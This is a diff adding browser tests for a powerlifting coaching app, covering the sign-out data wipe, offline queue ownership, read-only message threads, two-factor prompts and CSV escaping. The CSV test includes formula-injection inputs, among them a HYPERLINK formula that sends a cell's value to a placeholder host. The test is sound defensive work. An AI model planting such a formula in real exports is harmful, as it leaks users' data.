+   powa-* and sb-* key is put back exactly as it was, and nothing here sends anything.
+   =========================================================== */
+group('sign-out wipe, offline queue owner, CSV cells (security)');
+(() => {
+  const lsKeys = () => { const a = []; for (let i = 0; i < localStorage.length; i++) a.push(localStorage.key(i)); return a; };
+  const keep = {};
+  lsKeys().forEach(k => { if (/^(powa-|sb-)/.test(k)) keep[k] = localStorage.getItem(k); });
+  const realUser = window._user, realDB = typeof DB === 'undefined' ? undefined : DB, realOut = window._signingOut;
+  const put = (k, v) => localStorage.setItem(k, typeof v === 'string' ? v : JSON.stringify(v));
+  const clearQueues = () => [_PENDING_LOGS_KEY, _PENDING_ATTEMPTS_KEY, _OUTBOX_KEY, _OUTBOX_ATTEMPTS_KEY, _QUEUE_OWNER_KEY].forEach(k => localStorage.removeItem(k));
+  const queueOne = () => { clearQueues(); put(_PENDING_LOGS_KEY, [{ id: 'sec-l1', athleteId: 'sec-a', lift: 'squat', weight: 100, reps: 5, rpe: 8, date: '2026-10-28' }]); put(_OUTBOX_KEY, [{ key: 'bw:sec-a:2026-10-28', kind: 'bw', payload: { athleteId: 'sec-a', date: '2026-10-28', weight: 80 }, ts: 1 }]); };
+  try {
+    test('a log-out, deletion or refused session in progress writes no snapshot back (#4)', () => {
+      localStorage.removeItem('powa-snapshot-sec-a');
+      window._signingOut = true;
+      _saveSnapshot({ id: 'sec-a', name: 'A' }, { athletes: [] });
+      eq(localStorage.getItem('powa-snapshot-sec-a'), null, 'written while signing out');
+      window._signingOut = false;
+      _saveSnapshot({ id: 'sec-a', name: 'A' }, { athletes: [] });
+      assert(!!localStorage.getItem('powa-snapshot-sec-a'), 'an ordinary save still works');
+      localStorage.removeItem('powa-snapshot-sec-a');
+    });
+    test('a sign-out sweeps the private keys (snapshots, names, notes, Health readings, intake, billing, sent boards); device settings stay (#6)', () => {
+      const gone = ['powa-snapshot-sec-a', 'powa-snapshot-sec-b', 'powa-intake-draft-sec-a', 'powa-intake-sec-a', 'powa-health-recovery-sec-a', 'powa-health-food-sec-a',
+        'powa-health-sleep-sec-a', 'powa-cut-sec-a', 'powa-ds-names', 'powa-coach-notes-sec-c', 'powa-client-billing-sec-c', 'powa-teams-sec-c',
+        'powa-fca-sec-f', 'powa-ready-2026-10-28', 'powa-challenges-sec-c', 'powa-busy-week-sec-a', 'powa-attempt-plans', 'powa-club-board', 'powa-club-stats', 'powa-club-name',
+        'powa-md-demo-srv', 'powa-md-local-sec'];
+      const stay = { 'powa-theme': 'dark', 'powa-unit': 'kg', 'powa-desk-theme': 'light', 'powa-card-format': 'story', 'powa-consent': 'all', 'powa-desk-rail': '1', 'powa-push-off': '1' };
+      Object.keys(stay).forEach(k => put(k, stay[k]));
+      gone.forEach(k => put(k, '{"secret":"Priya, knee 7/10"}'));
+      put('powa-md-sent-board', { day: { name: 'Club meet', status: 'done' }, lifters: [{ name: 'Priya' }], cells: { a: 1 }, outbox: {}, dirtyLifters: {}, dirtyDay: false, pendingCreate: false });
+      put('powa-md-demo-md-1', { day: {}, lifters: [], cells: {}, outbox: { a: 1 } });   // the demo's board never counts as unsent work
+      assert(_sweepAccountKeys() >= gone.length + 2, 'counted');
+      gone.concat(['powa-md-sent-board', 'powa-md-demo-md-1']).forEach(k => eq(localStorage.getItem(k), null, k + ' left behind'));
+      Object.keys(stay).forEach(k => eq(localStorage.getItem(k), stay[k], k + ' (a setting) removed'));
+    });
+    test('every sign-out keeps the account\'s own settings and records: saved replies, weekly-note records, the OpenPowerlifting link, the Health switch and its bookkeeping', () => {
+      const own = ['powa-saved-replies-sec-c', 'powa-weekly-notes-sec-c', 'powa-week-changes-sec-c', 'powa-opl-sec-a', 'powa-health-on-sec-a', 'powa-health-access-sec-a',
+        'powa-health-decided-sec-a', 'powa-health-imported-sec-a', 'powa-health-sessions-sec-a', 'powa-health-share-sec-a', 'powa-health-share-food-sec-a',
+        'powa-health-share-off-pending-sec-a', 'powa-health-since-sec-a', 'powa-health-times-sec-a'];
+      own.forEach(k => put(k, '"kept"'));
+      own.forEach(k => eq(_accountKeyKind(k), 'own', k));
+      eq(_accountKeyKind('powa-health-recovery-sec-a'), 'private', 'sleep and heart readings are private');
+      eq(_accountKeyKind('powa-health-food-sec-a'), 'private', 'food readings are private');
+      eq(_accountKeyKind('powa-theme'), null, 'a device setting is no account key');
+      window._user = { id: 'sec-a' };
+      _wipeLocalUserData({ uid: 'sec-a' }); _sweepAccountKeys({ pending: true });   // a chosen log-out
+      _wipeLocalUserData({ uid: 'sec-a', keepQueue: true }); _sweepAccountKeys();     // a sign-out nobody chose
+      own.forEach(k => eq(localStorage.getItem(k), '"kept"', k + ' removed by a sign-out'));
+      own.forEach(k => localStorage.removeItem(k));
+    });
+    test('the coach\'s saved replies and the lifter\'s Health switch come back for the same account after a log-out (review of #6)', () => {
+      const was = window._demoMode; window._demoMode = false;
+      try {
+        const cid = 'sec-coach-0001-aaaa', lid = 'sec-lift-0001-bbbb';
+        window._user = { id: cid };
+        WeeklyNote.saveReplies(cid, ['Custom: film the top set'].concat(WeeklyNote.DEFAULT_REPLIES));
+        _wipeLocalUserData({ uid: cid }); window._user = null; _sweepAccountKeys({ pending: true });
+        window._user = { id: cid };
+        eq(WeeklyNote.loadReplies(cid)[0], 'Custom: film the top set', 'the coach\'s own reply is still there');
+        window._user = { id: lid };
+        put('powa-health-on-' + lid, true); put('powa-health-imported-' + lid, { 'bw-1': 81.2 });
+        put('powa-health-recovery-' + lid, { day: '2026-10-28', sleepMin: 410, rhr: 52 }); put('powa-opl-' + lid, { u: 'lifterlo', name: 'Lifter Lo' });
+        eq(PowaHealthJS.isOn(), true, 'on before');
+        _wipeLocalUserData({ uid: lid, keepQueue: true }); window._user = null; _sweepAccountKeys();
+        window._user = { id: lid };
+        eq(PowaHealthJS.isOn(), true, 'Apple Health is still on for them');
+        eq(PowaHealthJS.fromHealth({ id: 'bw-1', weight: 81.2 }), true, 'a weigh-in from Health is still known as one (never written back)');
+        eq(localStorage.getItem('powa-health-recovery-' + lid), null, 'last night\'s readings went');
+        assert(!!localStorage.getItem('powa-opl-' + lid), 'the OpenPowerlifting link stays');
+        window._user = { id: 'sec-other-9999-cccc' };
+        eq(PowaHealthJS.isOn(), false, 'another account on this device never gets their switch');
+        [WeeklyNote.repliesKey(cid), 'powa-health-on-' + lid, 'powa-health-imported-' + lid, 'powa-opl-' + lid].forEach(k => localStorage.removeItem(k));
+      } finally { window._demoMode = was; }
+    });
+    test('a deleted account takes every key that names it, and no other account\'s (#4)', () => {
+      const me = 'sec-del-0000-1111', other = 'sec-oth-0000-2222';
+      const mine = ['powa-saved-replies-' + me, 'powa-health-on-' + me, 'powa-health-times-' + me, 'powa-opl-' + me, 'powa-desk-pend-' + me, 'powa-desk-review-' + me,
+        'powa-pb-pub-' + me + '-prog-1', 'powa-signals-read-' + me, 'powa-coach-style-' + me, 'powa-snapshot-' + me];
+      const theirs = ['powa-saved-replies-' + other, 'powa-health-on-' + other, 'powa-desk-pend-' + other];
+      mine.concat(theirs).forEach(k => put(k, '"x"')); put('powa-theme', 'dark');
+      put('powa-md-unsent-del', { day: {}, lifters: [], cells: {}, outbox: { a: 1 } });
+      _wipeLocalUserData({ uid: me, deleted: true });
+      mine.concat(['powa-md-unsent-del']).forEach(k => eq(localStorage.getItem(k), null, k + ' left behind'));
+      theirs.forEach(k => eq(localStorage.getItem(k), '"x"', k + ' (another account\'s) removed'));
+      eq(localStorage.getItem('powa-theme'), 'dark');
+      eq(_forgetAccountKeys('a'), 0, 'never on a short id');
+      theirs.forEach(k => localStorage.removeItem(k));
+    });
+    test('an unsent meet-day board stays for its account through a sign-out it didn\'t choose; another account signing in drops it (review of #6)', () => {
+      clearQueues();
+      const coach = 'sec-md-coach-0001';
+      const unsent = { day: { name: 'Club meet' }, lifters: [{ name: 'Priya' }], cells: { a: 1 }, outbox: { a: 1 }, dirtyLifters: {}, pendingCreate: false };
+      put('powa-md-board-unsent', unsent);
+      put('powa-md-board-new', { day: { name: 'Open' }, lifters: [], cells: {}, outbox: {}, pendingCreate: true });
+      put('powa-md-board-lifter', { day: {}, lifters: [], cells: {}, outbox: {}, dirtyLifters: { l1: { _new: true } } });
+      put('powa-md-board-sent', { day: { status: 'done' }, lifters: [{ name: 'Priya' }], cells: {}, outbox: {} });
+      put('powa-md-local-' + coach, [{ id: 'board-new', name: 'Open', pending: true }]);
+      eq(_pendingBoardCount(), 3, 'three boards still have something to send');
+      eq(_queueHasItems(), true, 'they count as unsent work');
+      window._user = { id: coach };
+      _wipeLocalUserData({ uid: coach, keepQueue: true }); window._user = null; _sweepAccountKeys();
+      ['powa-md-board-unsent', 'powa-md-board-new', 'powa-md-board-lifter', 'powa-md-local-' + coach].forEach(k => assert(!!localStorage.getItem(k), k + ' dropped'));
+      eq(localStorage.getItem('powa-md-board-sent'), null, 'a board with nothing to send goes');
+      eq(_queueOwner(), coach, 'tagged with its account');
+      _reconcileQueueOwner(coach);
+      eq(_pendingBoardCount(), 3, 'the same coach signs back in: still there');
+      _reconcileQueueOwner('sec-someone-else-0002');
+      eq(_pendingBoardCount(), 0, 'another account: dropped'); eq(localStorage.getItem('powa-md-local-' + coach), null); eq(_queueOwner(), null);
+      put('powa-md-board-unsent', unsent);
+      _wipeLocalUserData({ uid: coach });
+      eq(localStorage.getItem('powa-md-board-unsent'), null, 'a chosen log-out (after asking) takes it');
+      put(_QUEUE_OWNER_KEY, 'sec-gone-0003');
+      _reconcileQueueOwner(coach);
+      eq(_queueOwner(), null, 'a tag with nothing under it just goes');
+    });
+    test('what the log-out question and the signed-out note say about a meet-day board', () => {
+      eq(_unsyncedWords({ sets: 0, changes: 0, boards: 1 }), '1 meet-day board');
+      eq(_unsyncedWords({ sets: 2, changes: 1, boards: 1 }), '2 sets, 1 change and 1 meet-day board');
+      eq(signedOutNoteText({ sets: 1, changes: 1 }), 'You were signed out. 1 set and 1 change wait on this device and sync when you log back in.');
+      eq(signedOutNoteText({ sets: 0, changes: 0, boards: 1 }), 'You were signed out. 1 meet-day board waits on this device for when you log back in.');
+      eq(signedOutNoteText({ sets: 2, boards: 1 }), 'You were signed out. 2 sets and 1 meet-day board wait on this device for when you log back in.');
+      eq(signedOutNoteText({}), 'You were signed out. Log in to carry on.');
+    });
+    test('the one snapshot on the device names the queue\'s owner; two say nothing', () => {
+      lsKeys().filter(k => /^powa-snapshot-/.test(k)).forEach(k => localStorage.removeItem(k));
+      put('powa-snapshot-sec-a', '{}');
+      eq(_lastSnapshotUid(), 'sec-a');
+      put('powa-snapshot-sec-b', '{}');
+      eq(_lastSnapshotUid(), null);
+      localStorage.removeItem('powa-snapshot-sec-a'); localStorage.removeItem('powa-snapshot-sec-b');
+    });
+    test('a chosen log-out takes the queues; a sign-out the person didn\'t choose keeps them, tagged with the account (#6)', () => {
+      window._user = { id: 'sec-a' };
+      queueOne();
+      _wipeLocalUserData({ uid: 'sec-a', keepQueue: true });
+      eq(_readPendingLogs().length, 1, 'sets kept'); eq(_readOutbox().length, 1, 'changes kept');
+      eq(_queueOwner(), 'sec-a', 'tagged');
+      _wipeLocalUserData({ uid: 'sec-a' });
+      eq(_readPendingLogs().length, 0, 'sets dropped'); eq(_readOutbox().length, 0, 'changes dropped'); eq(_queueOwner(), null, 'tag dropped');
+    });
+    test('the queue counts and sends only for its own account, never while nobody is signed in (#6)', () => {
+      queueOne(); put(_QUEUE_OWNER_KEY, 'sec-a');
+      let sent = 0;
+      window.DB = { addLog: () => { sent++; return Promise.resolve(); }, upsertBw: () => { sent++; return Promise.resolve(); } };
+      window._user = null;
+      eq(_queueIsMine(), false); eq(_pendingCount(), 0); eq(powaSyncState().sets, 0);
+      flushPendingLogs(); flushOutbox();
+      window._user = { id: 'sec-b' };
+      eq(_queueIsMine(), false, 'another account'); eq(_pendingCount(), 0); eq(powaSyncState().changes, 0);
+      flushPendingLogs(); flushOutbox();
+      eq(sent, 0, 'sent as someone else');
+      window._user = { id: 'sec-a' };
+      eq(_queueIsMine(), true); eq(_pendingCount(), 2);
+      const st = powaSyncState(); eq(st.sets, 1); eq(st.changes, 1);
+      localStorage.removeItem(_QUEUE_OWNER_KEY);
+      window._user = { id: 'sec-b' };
+      eq(_queueIsMine(), true, 'a queue from before the tag goes to whoever signs in next, as before');
+      clearQueues();
+    });
+    test('another account signing in drops the old queue; the same account keeps it; queueing claims it', () => {
+      queueOne(); put(_QUEUE_OWNER_KEY, 'sec-a');
+      _reconcileQueueOwner('sec-a');
+      eq(_readPendingLogs().length, 1, 'same account: kept');
+      _reconcileQueueOwner('sec-b');
+      eq(_readPendingLogs().length, 0, 'other account: dropped'); eq(_readOutbox().length, 0); eq(_queueOwner(), null);
+      clearQueues();
+      window._user = { id: 'sec-b' };
+      _queuePendingLog({ id: 'sec-l2', athleteId: 'sec-b' });
+      eq(_queueOwner(), 'sec-b', 'claimed when queued');
+      _tagQueueOwner('sec-z');
+      eq(_queueOwner(), 'sec-b', 'a tag is never moved');
+      clearQueues();
+      _tagQueueOwner('sec-z');
+      eq(_queueOwner(), null, 'nothing queued: no tag');
+    });
+    test('words for what still waits', () => {
+      eq(_unsyncedWords({ sets: 1, changes: 0 }), '1 set');
+      eq(_unsyncedWords({ sets: 3, changes: 2 }), '3 sets and 2 changes');
+      eq(_unsyncedWords({ sets: 0, changes: 1 }), '1 change');
+    });
+    test('a deleted account (no profile row) counts as refused; a network blip never does', () => {
+      eq(_isAuthError(new Error('Profile not found for 1234')), true);
+      eq(_isAuthError({ status: 401 }), true);
+      eq(_isAuthError(new TypeError('Failed to fetch')), false);
+      eq(_isAuthError(Object.assign(new Error('timeout'), { transient: true })), false);
+    });
+    test('CSV cells: a name that starts like a formula stays text, numbers stay numbers (#7)', () => {
+      eq(_csvEscape('=1+1'), "'=1+1");
+      eq(_csvEscape('=HYPERLINK("https://example.invalid/?d="&B3,"Arjun")'), '"\'=HYPERLINK(""https://example.invalid/?d=""&B3,""Arjun"")"');
+      eq(_csvEscape('@SUM(1,1)'), '"\'@SUM(1,1)"');
+      eq(_csvEscape('-2+3'), "'-2+3");
+      eq(_csvEscape('+1 call me'), "'+1 call me");
+      eq(_csvEscape('\t=1'), "'\t=1");
+      eq(_csvEscape('220.00'), '220.00');
+      eq(_csvEscape('-5.00'), '-5.00');
+      eq(_csvEscape('Arjun Mehta'), 'Arjun Mehta');
+    });
+  } finally {
+    window._user = realUser; window.DB = realDB; window._signingOut = realOut;
+    lsKeys().filter(k => /^(powa-|sb-)/.test(k) && !(k in keep)).forEach(k => localStorage.removeItem(k));
+    Object.keys(keep).forEach(k => localStorage.setItem(k, keep[k]));
+  }
+})();
+
+/* ===========================================================
+   A thread without a live coach-lifter link is read-only (row 59: a former coach, or a lifter who left,
+   reads the thread but can't send, react or mark read). Pure: who's asking and the roster are passed in.
+   =========================================================== */
+group('messages: a thread without a live link is read-only (row 59)');
+test('the lifter: live only with the coach they have now', () => {
+  eq(msgThreadLive('c1', 'a1', { id: 'a1', coachId: 'c1' }), true);
+  eq(msgThreadLive('c1', 'a1', { id: 'a1', coachId: null }), false, 'left their coach');
+  eq(msgThreadLive('c1', 'a1', { id: 'a1', coachId: 'c2' }), false, 'a new coach: the old thread is read-only');
+});
+test('the coach: live only for a lifter on their roster who is linked to them', () => {
+  const roster = [{ id: 'a1', coachId: 'c1' }, { id: 'a2', coachId: 'c1' }];
+  eq(msgThreadLive('c1', 'a1', { id: 'c1' }, roster), true);
+  eq(msgThreadLive('c1', 'a9', { id: 'c1' }, roster), false, 'not on the roster (released, or left)');
+  eq(msgThreadLive('c1', 'a1', { id: 'c1' }, [{ id: 'a1', coachId: 'c2' }]), false, 'on a stale list under another coach');
+  eq(msgThreadLive('c1', 'a1', { id: 'c1' }, []), false, 'nobody yet');
+});
+test('anyone else, or nothing to go on: not live', () => {
+  eq(msgThreadLive('c1', 'a1', { id: 'x9', coachId: 'c1' }, [{ id: 'a1', coachId: 'c1' }]), false, 'not in the thread');
+  eq(msgThreadLive('c1', 'a1', null), false, 'signed out');
+  eq(msgThreadLive('', 'a1', { id: 'a1', coachId: '' }), false, 'no coach id');
+});
+test('a refusal because the link ended is told apart from a hiccup', () => {
+  eq(msgLinkRefused({ code: '42501', message: 'new row violates row-level security policy for table "messages"' }), true);
+  eq(msgLinkRefused(new Error('new row violates row-level security policy for table "message_reactions"')), true, 'reactions (the message only)');
+  eq(msgLinkRefused(Object.assign(new Error('x'), { linkGone: true })), true, 'voice.js marks it');
+  eq(msgLinkRefused({ statusCode: '403', message: 'new row violates row-level security policy' }), true, 'storage (a voice note upload)');
+  eq(msgLinkRefused(new TypeError('Failed to fetch')), false);
+  eq(msgLinkRefused({ code: 'PGRST301', message: 'JWT expired' }), false);
+  eq(msgLinkRefused({ code: '23505', message: 'duplicate key value' }), false);
+  eq(msgLinkRefused(null), false);
+});
+test('what the read-only thread says, from either side', () => {
+  eq(msgClosedText(true, 'Maya'), 'Maya is no longer on your roster, so this thread is read-only.');
+  eq(msgClosedText(false, 'Alex'), 'Alex is no longer your coach, so this thread is read-only.');
+  eq(msgClosedText(true, ''), 'This lifter is no longer on your roster, so this thread is read-only.');
+  eq(msgClosedText(false, null), 'This coach is no longer your coach, so this thread is read-only.');
+});
+
+/* ===========================================================
+   The security merge's follow-ups (28 Oct: sec-sql + sec-2fa + sec-client on integ). The demo's log-out
+   leaves a real account's kept work alone; an account deleted elsewhere (Auth says so) goes as a deletion;
+   one two-factor prompt at a time, which a #login / #signup on load can't cancel. Like the sign-out group:
+   every powa-* and sb-* key is put back exactly as it was, and nothing here sends anything.
+   =========================================================== */
+group('security merge follow-ups (demo log-out, deleted elsewhere, one code prompt)');
+(() => {
+  const lsKeys = () => { const a = []; for (let i = 0; i < localStorage.length; i++) a.push(localStorage.key(i)); return a; };
+  const keep = {};
+  lsKeys().forEach(k => { if (/^(powa-|sb-)/.test(k)) keep[k] = localStorage.getItem(k); });
+  const realUser = window._user, realDemo = window._demoMode, realPending = window._mfaStepUpPending;
+  const put = (k, v) => localStorage.setItem(k, typeof v === 'string' ? v : JSON.stringify(v));
+  const REAL = 'fu-real-0000-1111';
+  const clearQueues = () => [_PENDING_LOGS_KEY, _PENDING_ATTEMPTS_KEY, _OUTBOX_KEY, _OUTBOX_ATTEMPTS_KEY, _QUEUE_OWNER_KEY].forEach(k => localStorage.removeItem(k));
+  const seedRealWork = () => {
+    clearQueues();
+    put(_PENDING_LOGS_KEY, [{ id: 'fu-l1', athleteId: REAL, lift: 'squat', weight: 100, reps: 5, rpe: 8, date: '2026-10-28' }]);
+    put(_QUEUE_OWNER_KEY, REAL);
+    put('powa-md-fu-real-board', { day: { name: 'Real meet' }, lifters: [], cells: { a: 1 }, outbox: { a: 1 }, pendingCreate: true });
+    put('powa-saved-replies-' + REAL, '["kept"]');
+  };
+  try {
+    test('the demo\'s log-out leaves a real account\'s tagged queue and unsent meet-day board on this device; the demo\'s own keys go (a)', () => {
+      seedRealWork();
+      put('powa-attempt-plans', { demo: 1 }); put('powa-md-demo-fu', { day: {}, lifters: [], cells: {}, outbox: {} });
+      window._demoMode = true; window._user = { id: 'demo-coach' };
+      // logout()'s demo path: _wipeLocalUserData({ uid, demo }), then the last sweep without the pending boards
+      _wipeLocalUserData({ uid: 'demo-coach', demo: true }); _sweepAccountKeys({ pending: false });
+      eq(_readPendingLogs().length, 1, 'the real account\'s unsent set'); eq(_queueOwner(), REAL, 'still tagged with its account');
+      assert(!!localStorage.getItem('powa-md-fu-real-board'), 'its unsent meet-day board was dropped');
+      eq(localStorage.getItem('powa-saved-replies-' + REAL), '["kept"]', 'its own saved replies');
+      eq(localStorage.getItem('powa-attempt-plans'), null, 'the demo\'s attempt plans stay behind');
+      eq(localStorage.getItem('powa-md-demo-fu'), null, 'the demo\'s board stays behind');
+      // the control: a chosen log-out of a real account still takes its queue and boards
+      window._demoMode = false; window._user = { id: REAL };
+      _wipeLocalUserData({ uid: REAL }); _sweepAccountKeys({ pending: true });
+      eq(_readPendingLogs().length, 0, 'a real log-out drops the sets'); eq(_queueOwner(), null);
+      eq(localStorage.getItem('powa-md-fu-real-board'), null, 'and the unsent board');
+      localStorage.removeItem('powa-saved-replies-' + REAL);
+    });
+    test('an account deleted elsewhere: only Auth\'s user_not_found counts, not an ended session or a hiccup (b)', () => {
+      eq(_isProfileMissing(new Error('Profile not found for 1234')), true);
+      eq(_isProfileMissing({ status: 401, message: 'JWT expired' }), false);
+      eq(authErrorUserGone({ status: 403, code: 'user_not_found', message: 'User from sub claim in JWT does not exist' }), true);
+      eq(authErrorUserGone({ message: 'User from sub claim in JWT does not exist' }), true, 'an older Auth with no code');
+      eq(authErrorUserGone({ status: 403, code: 'session_not_found', message: 'Session from session_id claim in JWT does not exist' }), false, 'signed out everywhere is not a deletion');
+      eq(authErrorUserGone({ status: 401, code: 'bad_jwt' }), false);
+      eq(authErrorUserGone(new TypeError('Failed to fetch')), false, 'offline');
+      eq(authErrorUserGone(null), false, 'Auth knows the user: a profile row the database hides (two-factor owed) or never made');
+    });
+    test('deleted elsewhere: the wipe takes its queue, boards and own keys, and the note says only "Log in to carry on" (b)', () => {
+      seedRealWork();
+      // _signedOutByServer(uid, { deleted: true }): the wipe and the note it leaves for the welcome screen
+      _wipeLocalUserData({ uid: REAL, deleted: true }); _sweepAccountKeys();
+      eq(_readPendingLogs().length, 0, 'its sets'); eq(_queueOwner(), null, 'its tag');
+      eq(localStorage.getItem('powa-md-fu-real-board'), null, 'its unsent board');
+      eq(localStorage.getItem('powa-saved-replies-' + REAL), null, 'its own keys (a deletion takes them)');
+      eq(signedOutNoteText(_signedOutNote({ deleted: true })), 'You were signed out. Log in to carry on.');
+      seedRealWork();
+      eq(signedOutNoteText(_signedOutNote({ deleted: true })), 'You were signed out. Log in to carry on.', 'never a "waits" line for a deleted account');
+      eq(signedOutNoteText(_signedOutNote()), 'You were signed out. 1 set and 1 meet-day board wait on this device for when you log back in.', 'the ordinary refused session still says what waits');
+      clearQueues(); localStorage.removeItem('powa-md-fu-real-board'); localStorage.removeItem('powa-saved-replies-' + REAL);
+    });
+    const realDom = typeof HTMLElement !== 'undefined' && document.body instanceof HTMLElement;
+    if (!realDom) {
+      skip('one code prompt at a time; #login on load can\'t cancel it (c)', 'needs a real DOM: open tests.html in a browser');
+    } else {
+      test('one code prompt at a time; #login on load can\'t cancel it (c)', () => {
+        const hash = location.hash, opened = [];
+        const realOpenLogin = window.openLoginModal;
+        try {
+          const p1 = promptMfaChallenge({ cancelLabel: 'Sign out' });
+          const p2 = promptMfaChallenge();
+          assert(p1 === p2, 'asked again while open: the same answer, not a second prompt');
+          eq(document.querySelectorAll('#mfaChallengeModal').length, 1);
+          assert(!!document.querySelector('#mfaChallengeModal.open'), 'open');
+          window.openLoginModal = () => opened.push('login');
+          history.replaceState(history.state, '', location.pathname + location.search + '#login');
+          window._mfaStepUpPending = true;
+          checkHashForModal();
+          assert(!!document.querySelector('#mfaChallengeModal.open'), '#login closed the code prompt (bootstrap\'s step-up)');
+          window._mfaStepUpPending = false;
+          checkHashForModal();
+          assert(!!document.querySelector('#mfaChallengeModal.open'), '#login closed the code prompt (a sign-in screen\'s)');
+          eq(opened.length, 0, 'the log-in modal waits');
+          document.getElementById('mfaChalCancel').click();
+          assert(!document.querySelector('#mfaChallengeModal.open'), 'Cancel answers it');
+          const p3 = promptMfaChallenge();
+          assert(p3 !== p1, 'answered: the next ask is a new prompt');
+          document.getElementById('mfaChalCancel').click();
+          checkHashForModal();
+          eq(opened.join(), 'login', 'with no prompt open, #login opens the log-in modal as before');
+        } finally {
+          window.openLoginModal = realOpenLogin; window._mfaStepUpPending = realPending;
+          history.replaceState(history.state, '', location.pathname + location.search + hash);
+          const m = document.getElementById('mfaChallengeModal'); if (m) { m.classList.remove('open'); m.remove(); }
+        }
+      });
+    }
+  } finally {
+    window._user = realUser; window._demoMode = realDemo; window._mfaStepUpPending = realPending;
+    lsKeys().filter(k => /^(powa-|sb-)/.test(k) && !(k in keep)).forEach(k => localStorage.removeItem(k));
+    Object.keys(keep).forEach(k => localStorage.setItem(k, keep[k]));
+  }
+})();
 
 function render() {
   const sum = document.getElementById('summary');
